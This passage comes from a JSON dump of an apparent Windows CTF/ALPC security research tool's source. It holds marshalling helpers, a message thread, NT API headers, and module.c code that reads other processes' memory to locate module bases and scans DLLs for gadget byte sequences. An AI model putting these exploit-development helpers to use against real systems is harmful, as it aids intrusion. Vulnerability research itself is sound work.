Result, SIZE_T MaxSize)\r\n{\r\n    BOOL FirstFlag = true;\r\n\r\n    ZeroMemory(Result, MaxSize);\r\n\r\n    for (ULONG bit = 0; bit < 32; bit++) {\r\n        if (Flags & (1 << bit)) {\r\n            PCHAR Name = GetMarshalFlagName(1 << bit);\r\n            PCHAR Current = strdup(Result);\r\n\r\n            if (Name == NULL) {\r\n                Name = \"<INVALID>\";\r\n            }\r\n\r\n            snprintf(Result, MaxSize, \"%s%s%s\", FirstFlag ? \"\" : \"|\", Current, Name);\r\n\r\n            free(Current);\r\n\r\n            FirstFlag = false;\r\n        }\r\n    }\r\n\r\n    return true;\r\n}\r\n\r\nDWORD GetMarshalFlagNum(PCHAR Flag)\r\n{\r\n    for (ULONG bit = 0; bit < 32; bit++) {\r\n        PCHAR Name = GetMarshalFlagName(1 << bit);\r\n        if (Name && strcmp(Name, Flag) == 0)\r\n            return 1 << bit;\r\n    }\r\n\r\n    return 0;\r\n}\r\n\r\nDWORD DecodeMarshalFlagsString(PCHAR MarshalFlags)\r\n{\r\n    DWORD Result = 0;\r\n    PCHAR Token;\r\n    DWORD Value;\r\n\r\n    // Make a copy of the parameter we can change.\r\n    MarshalFlags = strdup(MarshalFlags);\r\n\r\n    Token = strtok(MarshalFlags, \"| \\t\");\r\n    Value = GetMarshalFlagNum(Token);\r\n\r\n    if (Value == 0) {\r\n        LogMessage(stderr, \"Invalid flag %s ignored\", Token);\r\n    }\r\n\r\n    while (Token = strtok(NULL, \"| \\t\")) {\r\n        Value = GetMarshalFlagNum(Token);\r\n\r\n        if (Value == 0) {\r\n            LogMessage(stderr, \"Invalid flag %s ignored\", Token);\r\n        }\r\n\r\n        Result |= Value;\r\n    }\r\n\r\n    free(MarshalFlags);\r\n    return Result;\r\n}\r\n"
        },
        {
          "name": "marshal.h",
          "type": "blob",
          "size": 0.90625,
          "content": "#ifndef __MARSHAL_H\r\n#define __MARSHAL_H\r\n\r\nPVOID MarshalParamsInsertData(PCTF_MARSHAL_PARAM Base,\r\n                              ULONG Count,\r\n                              ULONG Index,\r\n                              DWORD TypeFlags,\r\n                              PVOID Data,\r\n                              SIZE_T Size,\r\n                              BOOL FreeOrig);\r\n\r\nvoid MarshalParamsFree(PCTF_MARSHAL_PARAM Base);\r\nvoid MarshalParamsDumpData(PCTF_MARSHAL_PARAM Base, ULONG Index);\r\nSIZE_T GetParamsSize(PCTF_MARSHAL_PARAM Base, ULONG Count);\r\n\r\n#define MarshalDataPtr(type, base, index) (type)((PBYTE)(base) + (base)[(index)].Start)\r\n\r\nPCHAR GetCommandName(UCHAR Command);\r\nINT GetCommandNum(PCHAR Command);\r\nPCHAR GetMarshalFlagName(DWORD Flag);\r\nBOOL GetMarshalFlagsString(DWORD Flags, PCHAR Result, SIZE_T MaxSize);\r\nDWORD GetMarshalFlagNum(PCHAR Flag);\r\nDWORD DecodeMarshalFlagsString(PCHAR MarshalFlags);\r\n\r\n#endif\r\n"
        },
        {
          "name": "messages.c",
          "type": "blob",
          "size": 1.59765625,
          "content": "#define WIN32_LEAN_AND_MEAN\n#define WIN32_NO_STATUS\n#include <windows.h>\n#include <winternl.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <stdbool.h>\n#include <tlhelp32.h>\n#include <psapi.h>\n#include <assert.h>\n#include <objbase.h>\n#include <sddl.h>\n#include <msctf.h>\n#include <shlwapi.h>\n#undef WIN32_NO_STATUS\n#include <ntstatus.h>\n\n#include \"ntdll.h\"\n#include \"ntalpctyp.h\"\n#include \"ntalpc.h\"\n\n#include \"ctfinternal.h\"\n#include \"ctftool.h\"\n#include \"marshal.h\"\n#include \"util.h\"\n#include \"messages.h\"\n\nMSG LastMsg;\n\n// In many scenarios, we might want the CTF server to post us messages intended\n// for other threads. This thread just loops and reads messages.\n// The last message received is accessible to ctftool commands.\nDWORD WINAPI MessageHandlerThread(PVOID Parameter)\n{\n    BOOL Result;\n\n    while (true) {\n        Result = GetMessage(&LastMsg, NULL, 0, 0);\n        if (Result != -1) {\n            LogMessage(stdout, \"Message Received:\\n\"\n                               \" hwnd:      %p\\n\"\n                               \" wParam:    %#x\\n\"\n                               \" lParam:    %#x\\n\"\n                               \" time:      %#x\\n\"\n                               \" pt:        %ld %ld\\n\",\n                               LastMsg.hwnd,\n                               LastMsg.wParam,\n                               LastMsg.lParam,\n                               LastMsg.time,\n                               LastMsg.pt.x,\n                               LastMsg.pt.y);\n        } else {\n            LogMessage(stdout, \"GetMessage() returned an error, %#x\", GetLastError());\n        }\n    }\n}\n\n//window thread\n//wtc\n"
        },
        {
          "name": "messages.h",
          "type": "blob",
          "size": 0.1845703125,
          "content": "#ifndef __MESSAGES_H\r\n#define __MESSAGES_H\r\n\r\n// The last thread message received.\r\n// TODO: Locking.\r\nextern MSG LastMsg;\r\n\r\nDWORD WINAPI MessageHandlerThread(PVOID Parameter);\r\n\r\n#endif\r\n"
        },
        {
          "name": "module.c",
          "type": "blob",
          "size": 9.3935546875,
          "content": "#include <windows.h>\n#include <winternl.h>\n#include <stdio.h>\n#include <stdbool.h>\n#include <psapi.h>\n#include <shlwapi.h>\n\n#include \"util.h\"\n\n// Look, it works good enough. What other option is there, the Russinovich\n// trick of extracting an embedded image?????\n\n#ifdef _WIN64\n// If you are trying to make this 64bit, you can just replace this whole file\n// with return (UINT64) LoadLibrary(Module)\n# error This code is unnescessary on 64bit.\n#endif\n\n#pragma warning(disable: 6387)\n\ntypedef struct _PROCESS_BASIC_INFORMATION64 {\n    ULONGLONG Reserved1;\n    ULONGLONG PebBaseAddress;\n    ULONGLONG Reserved2[2];\n    ULONGLONG UniqueProcessId;\n    ULONGLONG Reserved3;\n} PROCESS_BASIC_INFORMATION64;\n\ntypedef struct _PEB_LDR_DATA64 {\n    ULONG Length;\n    BOOLEAN Initialized;\n    ULONGLONG SsHandle;\n    LIST_ENTRY64 InLoadOrderModuleList;\n    LIST_ENTRY64 InMemoryOrderModuleList;\n    LIST_ENTRY64 InInitializationOrderModuleList;\n} PEB_LDR_DATA64, *PPEB_LDR_DATA64;\n\n// Structure is cut down to ProcessHeap.\ntypedef struct _PEB64 {\n    BOOLEAN InheritedAddressSpace;\n    BOOLEAN ReadImageFileExecOptions;\n    BOOLEAN BeingDebugged;\n    BOOLEAN Spare;\n    ULONGLONG Mutant;\n    ULONGLONG ImageBaseAddress;\n    ULONGLONG LoaderData;\n    ULONGLONG ProcessParameters;\n    ULONGLONG SubSystemData;\n    ULONGLONG ProcessHeap;\n} PEB64;\n\ntypedef struct _UNICODE_STRING64 {\n    USHORT Length;\n    USHORT MaximumLength;\n    ULONGLONG Buffer;\n} UNICODE_STRING64;\n\ntypedef struct _LDR_DATA_TABLE_ENTRY64 {\n    LIST_ENTRY64 InLoadOrderModuleList;\n    LIST_ENTRY64 InMemoryOrderModuleList;\n    LIST_ENTRY64 InInitializationOrderModuleList;\n    ULONGLONG BaseAddress;\n    ULONGLONG EntryPoint;\n    DWORD64 SizeOfImage;\n    UNICODE_STRING64 FullDllName;\n    UNICODE_STRING64 BaseDllName;\n    ULONG Flags;\n    SHORT LoadCount;\n    SHORT TlsIndex;\n    LIST_ENTRY64 HashTableEntry;\n    ULONGLONG TimeDateStamp;\n} LDR_DATA_TABLE_ENTRY64, *PLDR_DATA_TABLE_ENTRY64;\n\nNTSTATUS (NTAPI *NtWow64ReadVirtualMemory64)(\n    IN HANDLE ProcessHandle,\n    IN ULONGLONG BaseAddress,\n    OUT PVOID Buffer,\n    IN ULONG64 Size,\n    OUT PULONG64 NumberOfBytesRead\n);\n\nNTSTATUS (NTAPI *NtWow64QueryInformationProcess64) (\n    IN HANDLE ProcessHandle,\n    IN PROCESSINFOCLASS ProcessInformationClass,\n    OUT PVOID ProcessInformation,\n    IN ULONG ProcessInformationLength,\n    OUT PULONG ReturnLength OPTIONAL\n);\n\nBOOL FindModule(HANDLE Process, PCHAR Module, PULONGLONG BaseAddress)\n{\n    CHAR ModuleBaseName[MAX_PATH] = {0};\n    WCHAR ModuleWideName[MAX_PATH] = {0};\n    PROCESS_BASIC_INFORMATION64 ProcessInfo = {0};\n    LDR_DATA_TABLE_ENTRY64 LdrTableEntry = {0};\n    PEB_LDR_DATA64 PebLdrData;\n    PEB64 Peb;\n    ULONGLONG ListHead;\n    ULONGLONG LdrEntryAddress;\n    NTSTATUS Result;\n\n    Result = NtWow64QueryInformationProcess64(Process,\n                                         ProcessBasicInformation,\n                                         &ProcessInfo,\n                                         sizeof ProcessInfo,\n                                         NULL);\n\n    if (Result != 0) {\n        fprintf(stderr, \"Failed to query PEB address, %#x\\n\",Result);\n        return false;\n    }\n\n    Result = NtWow64ReadVirtualMemory64(Process,\n                                        ProcessInfo.PebBaseAddress,\n                                        &Peb,\n                                        sizeof Peb,\n                                        NULL);\n    if (Result != 0) {\n        fprintf(stderr, \"Failed to read PEB from %#llx, %#x\\n\",\n                        ProcessInfo.PebBaseAddress,\n                        Result);\n        return false;\n    }\n\n    Result = NtWow64ReadVirtualMemory64(Process,\n                                        Peb.LoaderData,\n                                        &PebLdrData,\n                                        sizeof PebLdrData,\n                                        NULL);\n    if (Result  != 0) {\n        fprintf(stderr, \"Failed to PEB LoaderData from %#llx, %#x\\n\", Peb.LoaderData, Result);\n        return false;\n    }\n\n    ListHead = Peb.LoaderData\n               + (offsetof(PEB_LDR_DATA64, InLoadOrderModuleList)\n                - offsetof(PEB_LDR_DATA64, Length));\n\n    for (LdrEntryAddress = PebLdrData.InLoadOrderModuleList.Flink;\n         ListHead       != LdrTableEntry.InLoadOrderModuleList.Flink;\n         LdrEntryAddress = LdrTableEntry.InLoadOrderModuleList.Flink) {\n        Result = NtWow64ReadVirtualMemory64(Process,\n                                            LdrEntryAddress,\n                                            &LdrTableEntry,\n                                            sizeof LdrTableEntry,\n                                            NULL);\n        if (Result != 0) {\n            fprintf(stderr, \"Failed to read a LDR List Entry from %#llx, %#x\\n\",\n                            LdrEntryAddress,\n                            Result);\n            return false;\n        }\n\n        if (NtWow64ReadVirtualMemory64(Process,\n                                       LdrTableEntry.BaseDllName.Buffer,\n                                       ModuleWideName,\n                                       LdrTableEntry.BaseDllName.MaximumLength,\n                                       FALSE) != 0) {\n            fprintf(stderr, \"Failed to read module name from %#llx, %#x\\n\",\n                            LdrTableEntry.BaseDllName.Buffer,\n                            Result);\n            return false;\n        }\n\n        PathRemoveExtensionW(ModuleWideName);\n\n        // Translate to ANSI.\n        snprintf(ModuleBaseName, sizeof ModuleBaseName, \"%S\", ModuleWideName);\n\n        if (stricmp(ModuleBaseName, Module) == 0) {\n            *BaseAddress = LdrTableEntry.BaseAddress;\n            return true;\n        }\n    }\n\n    return false;\n}\n\n// Look, I know this is hacky ;)\nUINT64 QueryModuleHandle64(PCHAR Module)\n{\n    BOOL WoWStatus;\n    DWORD Processes[4096];\n    DWORD ProcessTableSize;\n    ULONGLONG BaseAddress;\n\n    if (!NtWow64ReadVirtualMemory64 || !NtWow64QueryInformationProcess64) {\n        NtWow64ReadVirtualMemory64 = (PVOID) GetProcAddress(\n            GetModuleHandle(\"NTDLL\"),\n            \"NtWow64ReadVirtualMemory64\");\n        NtWow64QueryInformationProcess64 = (PVOID) GetProcAddress(\n            GetModuleHandle(\"NTDLL\"),\n            \"NtWow64QueryInformationProcess64\");\n    }\n\n    // Get a list of all the system processes.\n    if (EnumProcesses(Processes, sizeof Processes, &ProcessTableSize) == FALSE) {\n        LogMessage(stderr, \"Failed to EnumProcesses(), %#x\", GetLastError());\n        return 0;\n    }\n\n    ProcessTableSize /= sizeof *Processes;\n\n    // For each process, try to get a handle, see if it's a 64bit process, and\n    // if so, see if it has the requested module loaded.\n    //\n    // Yes, I know - \"wtffff is Tavis doing\"...let's see your solution smarty pants!\n    for (DWORD i = 0; i < ProcessTableSize; i++) {\n        BOOL Result;\n        HANDLE Process;\n\n        Process = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,\n                              FALSE,\n                              Processes[i]);\n        Result  = FALSE;\n\n        if (Process != NULL) {\n            if (IsWow64Process(Process, &WoWStatus) && !WoWStatus) {\n                Result = FindModule(Process, Module, &BaseAddress);\n            }\n\n            CloseHandle(Process);\n\n            if (Result) {\n                return BaseAddress;\n            }\n        }\n    }\n\n    return 0;\n}\n\nINT64 FindGadgetOffset(PCHAR Module, PCHAR Gadget, SIZE_T GadgetLen)\n{\n    FILE *Input;\n    INT64 Result = -1;\n    CHAR ModulePath[MAX_PATH];\n    CHAR Buffer[8192];\n    CHAR *Ptr;\n    PVOID OldValue;\n\n    // Copy the name while we figure out where it is.\n    strncpy(ModulePath, Module, MAX_PATH - 5);\n\n    // Is it already fully qualified?\n    if (PathIsRelative(Module)) {\n        // This doesnt do anything if there already is an extension.\n        PathAddExtension(ModulePath, \".DLL\");\n\n        // Check the usual places for it.\n        PathFindOnPathA(ModulePath, NULL);\n    }\n\n    LogMessage(stdout, \"Guessed %s => %s\", Module, ModulePath);\n\n    // Disable Redirection so we get the real files.\n    Wow64DisableWow64FsRedirection(&OldValue);\n\n    Input = fopen(ModulePath, \"rb\");\n\n    // Restore Redirection.\n    Wow64RevertWow64FsRedirection(OldValue);\n\n    while (Input) {\n        size_t count = fread(Buffer, 1, sizeof Buffer, Input);\n        size_t offset = 0;\n\n        //LogMessage(stderr, \"fread() => %lu (offset %lu)\", count, ftell(Input));\n\n        if (count == 0)\n            goto cleanup;\n\n        for (Ptr = memchr(Buffer, *Gadget, count);\n             Ptr;\n             Ptr = memchr(Ptr + 1, *Gadget, count - (offset + 1))) {\n            offset = Ptr - Buffer;\n\n            // If this match spans a read, seek back so its at the start.\n            if (count - offset < GadgetLen) {\n\n                //LogMessage(stderr, \"Not enough data, count %lu offset %lu, ftell %lu\", count, offset, ftell(Input));\n\n                // Make sure there was enough data to read.\n                if (offset) {\n                    //LogMessage(stderr, \"rewind\");\n                    fseek(Input, -offset, SEEK_CUR);\n                    break;\n                }\n\n                // Not enough data left.\n                goto cleanup;\n            }\n\n            if (memcmp(Ptr, Gadget, GadgetLen) == 0) {\n                //LogMessage(stderr, \"match at %lu (ftell %lu)\", offset, ftell(Input));\n                Result = ftell(Input) - count + offset;\n                goto cleanup;\n            }\n        }\n    }\n\ncleanup:\n    if (Input) {\n        fclose(Input);\n    }\n    return Result;\n}"
        },
        {
          "name": "ntalpc.h",
          "type": "blob",
          "size": 5.6416015625,
          "content": "/****************************************************************************\n ****************************************************************************\n ***\n ***   This header was created to make information necessary for userspace\n ***   to call into the Windows kernel available to Dr. Memory.  It contains\n ***   only constants, structures, and macros, and thus, contains no\n ***   copyrightable information.\n ***\n ****************************************************************************\n ****************************************************************************/\n\nNTSTATUS NTAPI\nNtAlpcAcceptConnectPort(\n    __out PHANDLE                        PortHandle,\n    __in HANDLE                          ConnectionPortHandle,\n    __in ULONG                           Flags,\n    __in POBJECT_ATTRIBUTES              ObjectAttributes,\n    __in PALPC_PORT_ATTRIBUTES           PortAttributes,\n    __in_opt PVOID                       PortContext, // opaque value\n    __in PPORT_MESSAGE                   ConnectionRequest,\n    __inout_opt PALPC_MESSAGE_ATTRIBUTES MessageAttributes,\n    __in BOOLEAN                         AcceptConnection\n    );\n\nNTSTATUS NTAPI\nNtAlpcCancelMessage(\n    __in HANDLE                  PortHandle,\n    __in ULONG                   Flags,\n    __in ALPC_CONTEXT_ATTRIBUTES MessageContext\n    );\n\nNTSTATUS NTAPI\nNtAlpcConnectPort(\n    __out PHANDLE                           PortHandle,\n    __in PUNICODE_STRING                    PortName,\n    __in POBJECT_ATTRIBUTES                 ObjectAttributes,\n    __in_opt PALPC_PORT_ATTRIBUTES          PortAttributes,\n    __in ULONG                              Flags,\n    __in_opt PSID                           Sid,\n    __inout PPORT_MESSAGE                   ConnectionMessage,\n    __inout_opt PULONG                      BufferLength,\n    __inout_opt PALPC_MESSAGE_ATTRIBUTES    OutMessageAttributes,\n    __inout_opt PALPC_MESSAGE_ATTRIBUTES    InMessageAttributes,\n    __in_opt PLARGE_INTEGER                 Timeout\n    );\n\nNTSTATUS NTAPI\nNtAlpcCreatePort(\n    __out PHANDLE                   PortHandle,\n    __in POBJECT_ATTRIBUTES         ObjectAttributes,\n    __in_opt PALPC_PORT_ATTRIBUTES  PortAttributes\n    );\n\nNTSTATUS NTAPI\nNtAlpcCreatePortSection(\n    __in HANDLE     PortHandle,\n    __in ULONG      Flags,\n    __in_opt HANDLE SectionHandle,\n    __in ULONG      SectionSize,\n    __out PHANDLE   AlpcSectionHandle,\n    __out PULONG    ActualSectionSize\n    );\n\nNTSTATUS NTAPI\nNtAlpcCreateResourceReserve(\n    __in HANDLE         PortHandle,\n    __reserved ULONG    Flags,\n    __in SIZE_T         MessageSize,\n    __out PHANDLE       ResourceID\n    );\n\nNTSTATUS NTAPI\nNtAlpcCreateSectionView(\n    __in HANDLE             PortHandle,\n    __reserved ULONG        Flags,\n    __inout PALPC_DATA_VIEW ViewAttrbutes\n    );\n\nNTSTATUS NTAPI\nNtAlpcCreateSecurityContext(\n    __in HANDLE                       PortHandle,\n    __reserved ULONG                  Flags,\n    __inout PALPC_SECURITY_ATTRIBUTES SecurityAttribute\n    );\n\nNTSTATUS NTAPI\nNtAlpcDeletePortSection(\n    __in HANDLE      PortHandle,\n    __reserved ULONG Flags,\n    __in HANDLE      SectionHandle\n    );\n\nNTSTATUS NTAPI\nNtAlpcDeleteResourceReserve(\n    __in HANDLE      PortHandle,\n    __reserved ULONG Flags,\n    __in HANDLE      ResourceID\n    );\n\nNTSTATUS NTAPI\nNtAlpcDeleteSectionView(\n    __in HANDLE      PortHandle,\n    __reserved ULONG Flags,\n    __in PVOID       ViewBase\n    );\n\nNTSTATUS NTAPI\nNtAlpcDeleteSecurityContext(\n    __in HANDLE      PortHandle,\n    __reserved ULONG Flags,\n    __in HANDLE      ContextHandle\n    );\n\nNTSTATUS NTAPI\nNtAlpcDisconnectPort(\n    __in HANDLE PortHandle,\n    __in ULONG  Flags\n    );\n\nNTSTATUS NTAPI\nNtAlpcImpersonateClientOfPort(\n    __in HANDLE         PortHandle,\n    __in PPORT_MESSAGE  PortMessage,\n    __reserved PVOID    Reserved\n    );\n\nNTSTATUS NTAPI\nNtAlpcOpenSenderProcess(\n    __out HANDLE            ProcessHandle,\n    __in HANDLE             PortHandle,\n    __in PPORT_MESSAGE      PortMessage,\n    __reserved ULONG        Flags,\n    __in ACCESS_MASK        Access,\n    __in POBJECT_ATTRIBUTES ObjectAttribute\n    );\n\nNTSTATUS NTAPI\nNtAlpcOpenSenderThread(\n    __out HANDLE            ThreadHandle,\n    __in HANDLE             PortHandle,\n    __in PPORT_MESSAGE      PortMessage,\n    __reserved ULONG        Flags,\n    __in ACCESS_MASK        Access,\n    __in POBJECT_ATTRIBUTES ObjectAttributes\n    );\n\nNTSTATUS NTAPI\nNtAlpcQueryInformation(\n    __in HANDLE                      PortHandle,\n    __in ALPC_PORT_INFORMATION_CLASS PortInformationClass,\n    __out_bcount(Length) PVOID       PortInformation,\n    __in ULONG                       Length,\n    __out_opt PULONG                 ReturnLength\n    );\n\nNTSTATUS NTAPI\nNtAlpcQueryInformationMessage(\n    __in HANDLE                         PortHandle,\n    __in PPORT_MESSAGE                  PortMessage,\n    __in ALPC_MESSAGE_INFORMATION_CLASS MessageInformationClass,\n    __out_bcount(Length) PVOID          MessageInformation,\n    __in ULONG                          Length,\n    __out_opt PULONG                    ReturnLength\n    );\n\nNTSTATUS NTAPI\nNtAlpcRevokeSecurityContext(\n    __in HANDLE      PortHandle,\n    __reserved ULONG Flags,\n    __in HANDLE      ContextHandle\n    );\n\nNTSTATUS NTAPI\nNtAlpcSendWaitReceivePort(\n    __in HANDLE                             PortHandle,\n    __in ULONG                              Flags,\n    __in_opt PPORT_MESSAGE                  SendMessage,\n    __inout_opt PALPC_MESSAGE_ATTRIBUTES    SendMessageAttributes,\n    __inout_opt PPORT_MESSAGE               ReceiveMessage,\n    __inout_opt PULONG                      BufferLength,\n    __inout_opt PALPC_MESSAGE_ATTRIBUTES    ReceiveMessageAttributes,\n    __in_opt PLARGE_INTEGER                 TimeOut\n    );\n\n"
        },
        {
          "name": "ntalpctyp.h",
          "type": "blob",
          "size": 3.2041015625,
          "content": "/****************************************************************************\n ****************************************************************************\n ***\n ***   This header was created to make information necessary for userspace\n ***   to call into the Windows kernel available to Dr. Memory.  It contains\n ***   only constants, structures, and macros, and thus, contains no\n ***   copyrightable information.\n ***\n ****************************************************************************\n ****************************************************************************/\n\n#define ALPC_MESSAGE_SECURITY_ATTRIBUTE 0x80000000\n#define ALPC_MESSAGE_VIEW_ATTRIBUTE     0x40000000\n#define ALPC_MESSAGE_CONTEXT_ATTRIBUTE  0x20000000\n#define ALPC_MESSAGE_HANDLE_ATTRIBUTE   0x10000000\n\n#define ALPC_MSGFLG_REPLY_MESSAGE   0x1\n#define ALPC_MSGFLG_LPC_MODE        0x2\n#define ALPC_MSGFLG_RELEASE_MESSAGE 0x10000\n#define ALPC_MSGFLG_SYNC_REQUEST    0x20000\n#define ALPC_MSGFLG_WAIT_USER_MODE  0x100000\n#define ALPC_MSGFLG_WAIT_ALERTABLE  0x200000\n#define ALPC_MSGFLG_WOW64_CALL      0x80000000\n\n#define ALPC_PORFLG_ALLOW_LPC_REQUESTS 0x20000\n#define ALPC_PORFLG_WAITABLE_PORT 0x40000\n#define ALPC_PORFLG_SYSTEM_PROCESS 0x100000\n\ntypedef struct _ALPC_CONTEXT_ATTRIBUTES\n{\n    PVOID PortContext;\n    PVOID MessageContext;\n    ULONG SequenceNumber;\n    ULONG MessageID;\n    ULONG CallbackID;\n} ALPC_CONTEXT_ATTRIBUTES, *PALPC_CONTEXT_ATTRIBUTES;\n\ntypedef struct _ALPC_DATA_VIEW\n{\n    ULONG Flags;\n    HANDLE SectionHandle;\n    PVOID ViewBase;\n    SIZE_T ViewSize;\n} ALPC_DATA_VIEW, *PALPC_DATA_VIEW;\n\ntypedef struct _ALPC_SECURITY_ATTRIBUTES\n{\n    ULONG Flags;\n    PSECURITY_QUALITY_OF_SERVICE SecurityQos;\n    HANDLE ContextHandle;\n    ULONG Reserved1;\n    ULONG Reserved2;\n} ALPC_SECURITY_ATTRIBUTES, *PALPC_SECURITY_ATTRIBUTES;\n\ntypedef struct _ALPC_HANDLE_ATTRIBUTES\n{\n    ULONG Flags;\n    HANDLE Handle;\n    ULONG ObjectType;\n    ACCESS_MASK DesiredAccess;\n} ALPC_HANDLE_ATTRIBUTES, *PALPC_HANDLE_ATTRIBUTES;\n\n\n/***************************************************************************\n * from pdb files\n */\ntypedef struct _ALPC_PORT_ATTRIBUTES\n{\n    ULONG Flags;\n    SECURITY_QUALITY_OF_SERVICE SecurityQos;\n    SIZE_T MaxMessageLength;\n    SIZE_T MemoryBandwidth;\n    SIZE_T MaxPoolUsage;\n    SIZE_T MaxSectionSize;\n    SIZE_T MaxViewSize;\n    SIZE_T MaxTotalSectionSize;\n    ULONG DupObjectTypes;\n#ifdef X64\n    ULONG Reserved;\n#endif\n} ALPC_PORT_ATTRIBUTES, *PALPC_PORT_ATTRIBUTES;\n\ntypedef struct _ALPC_MESSAGE_ATTRIBUTES\n{\n    ULONG AllocatedAttributes;\n    ULONG ValidAttributes;\n} ALPC_MESSAGE_ATTRIBUTES, *PALPC_MESSAGE_ATTRIBUTES;\n\ntypedef enum _ALPC_PORT_INFORMATION_CLASS\n{\n    AlpcBasicInformation,\n    AlpcPortInformation,\n    AlpcAssociateCompletionPortInformation,\n    AlpcConnectedSIDInformation,\n    AlpcServerInformation,\n    AlpcMessageZoneInformation,\n    AlpcRegisterCompletionListInformation,\n    AlpcUnregisterCompletionListInformation,\n    AlpcAdjustCompletionListConcurrencyCountInformation,\n    AlpcRegisterCallbackInformation,\n    AlpcCompletionListRundownInformation\n} ALPC_PORT_INFORMATION_CLASS;\n\ntypedef enum _ALPC_MESSAGE_INFORMATION_CLASS\n{\n    AlpcMessageSidInformation,\n    AlpcMessageTokenModifiedIdInformation\n} ALPC_MESSAGE_INFORMATION_CLASS;\n"
        },
        {
          "name": "ntdll.h",
          "type": "blob",
          "size": 105.9677734375,
          "content": "/*****************************************************************************/\r\n/* Ntdll.h                                Copyright (c) Ladislav Zezula 2005 */\r\n/*---------------------------------------------------------------------------*/\r\n/* Header file for the import library \"Ntdll.lib\"                            */\r\n/*                                                                           */\r\n/* This library has been created because of never-ending problems when       */\r\n/* Ntdll.lib from Windows DDK with SDK libs (duplicate symbols, linker       */\r\n/* errors etc).                                                              */\r\n/* Now, it is possible to use native NT API with no problems, all you need   */\r\n/* is just to include this header file                                       */\r\n/*---------------------------------------------------------------------------*/\r\n/*   Date    Ver   Who  Comment                                              */\r\n/* --------  ----  ---  -------                                              */\r\n/* 15.05.03  1.00  Lad  The first version of Ntdll.h                         */\r\n/* 16.09.05  2.00  Lad  Far more functions                                   */\r\n/*****************************************************************************/\r\n\r\n#ifndef __NTDLL_H__\r\n#define __NTDLL_H__\r\n\r\n#ifdef __cplusplus\r\nextern \"C\" {\r\n#endif\r\n\r\n#ifdef _NTDDK_\r\n#error This header cannot be compiled together with NTDDK\r\n#endif\r\n\r\n#ifndef _NTDLL_SELF_                            // Auto-insert the library\r\n#pragma comment(lib, \"Ntdll.lib\")\r\n#endif\r\n\r\n#pragma warning(disable: 4201)                  // nonstandard extension used : nameless struct/union\r\n\r\n#ifndef NT_SUCCESS\r\n#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)\r\n#endif\r\n\r\n#ifndef STATUS_SUCCESS\r\n#define STATUS_SUCCESS       ((NTSTATUS)0x00000000L)\r\n#endif\r\n\r\n#ifndef STATUS_UNSUCCESSFUL\r\n#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)\r\n#endif\r\n\r\n#ifndef ASSERT\r\n#ifdef _DEBUG\r\n#define ASSERT(x) assert(x)\r\n#else\r\n#define ASSERT(x) /* x */\r\n#endif\r\n#endif\r\n\r\n#ifndef DEVICE_TYPE\r\n#define DEVICE_TYPE DWORD\r\n#endif\r\n\r\n//-----------------------------------------------------------------------------\r\n// Definition of intervals for waiting functions\r\n\r\n#define ABSOLUTE_INTERVAL(wait) (wait)\r\n\r\n#define RELATIVE_INTERVAL(wait) (-(wait))\r\n\r\n#define NANOSECONDS(nanos) \\\r\n(((signed __int64)(nanos)) / 100L)\r\n\r\n#define MICROSECONDS(micros) \\\r\n(((signed __int64)(micros)) * NANOSECONDS(1000L))\r\n\r\n#define MILISECONDS(mili) \\\r\n(((signed __int64)(mili)) * MICROSECONDS(1000L))\r\n\r\n#define SECONDS(seconds) \\\r\n(((signed __int64)(seconds)) * MILISECONDS(1000L))\r\n\r\n//------------------------------------------------------------------------------\r\n// Structures\r\n\r\ntypedef enum _EVENT_TYPE\r\n{\r\n    NotificationEvent,\r\n    SynchronizationEvent\r\n\r\n} EVENT_TYPE;\r\n\r\n#define UNICODE_NULL ((WCHAR)0) // winnt\r\n\r\n//\r\n// Valid values for the Attributes field\r\n//\r\n\r\n#define OBJ_INHERIT             0x00000002L\r\n#define OBJ_PERMANENT           0x00000010L\r\n#define OBJ_EXCLUSIVE           0x00000020L\r\n#define OBJ_CASE_INSENSITIVE    0x00000040L\r\n#define OBJ_OPENIF              0x00000080L\r\n#define OBJ_OPENLINK            0x00000100L\r\n#define OBJ_KERNEL_HANDLE       0x00000200L\r\n#define OBJ_FORCE_ACCESS_CHECK  0x00000400L\r\n\r\n//\r\n// CURDIR structure\r\n//\r\n\r\ntypedef struct _CURDIR\r\n{\r\n    UNICODE_STRING DosPath;\r\n    HANDLE Handle;\r\n\r\n} CURDIR, *PCURDIR;\r\n\r\n\r\n//------------------------------------------------------------------------------\r\n// Macros\r\n\r\n#ifndef InitializeObjectAttributes\r\n#define InitializeObjectAttributes( p, n, a, r, s ) {   \\\r\n    (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \\\r\n    (p)->RootDirectory = r;                             \\\r\n    (p)->Attributes = a;                                \\\r\n    (p)->ObjectName = n;                                \\\r\n    (p)->SecurityDescriptor = s;                        \\\r\n    (p)->SecurityQualityOfService = NULL;               \\\r\n    }\r\n#endif\r\n\r\n//\r\n// Macros for handling LIST_ENTRY-based lists\r\n//\r\n\r\n#if !defined(_WDMDDK_) && !defined(_LIST_ENTRY_MACROS_DEFINED_)\r\n#define _LIST_ENTRY_MACROS_DEFINED_\r\n\r\nBOOLEAN\r\nFORCEINLINE\r\nIsListEmpty(\r\n    IN const LIST_ENTRY * ListHead\r\n    )\r\n{\r\n    return (BOOLEAN)(ListHead->Flink == ListHead);\r\n}\r\n\r\nFORCEINLINE\r\nVOID\r\nInitializeListHead(\r\n    IN PLIST_ENTRY ListHead\r\n    )\r\n{\r\n    ListHead->Flink = ListHead->Blink = ListHead;\r\n}\r\n\r\nFORCEINLINE\r\nVOID\r\nInsertHeadList(\r\n    IN OUT PLIST_ENTRY ListHead,\r\n    IN OUT PLIST_ENTRY Entry\r\n    )\r\n{\r\n    PLIST_ENTRY Flink;\r\n\r\n    Flink = ListHead->Flink;\r\n    Entry->Flink = Flink;\r\n    Entry->Blink = ListHead;\r\n    Flink->Blink = Entry;\r\n    ListHead->Flink = Entry;\r\n}\r\n\r\nFORCEINLINE\r\nVOID\r\nInsertTailList(\r\n    IN OUT PLIST_ENTRY ListHead,\r\n    IN OUT PLIST_ENTRY Entry\r\n    )\r\n{\r\n    PLIST_ENTRY Blink;\r\n\r\n    Blink = ListHead->Blink;\r\n    Entry->Flink = ListHead;\r\n    Entry->Blink = Blink;\r\n    Blink->Flink = Entry;\r\n    ListHead->Blink = Entry;\r\n}\r\n\r\nFORCEINLINE\r\nBOOLEAN\r\nRemoveEntryList(\r\n    IN PLIST_ENTRY 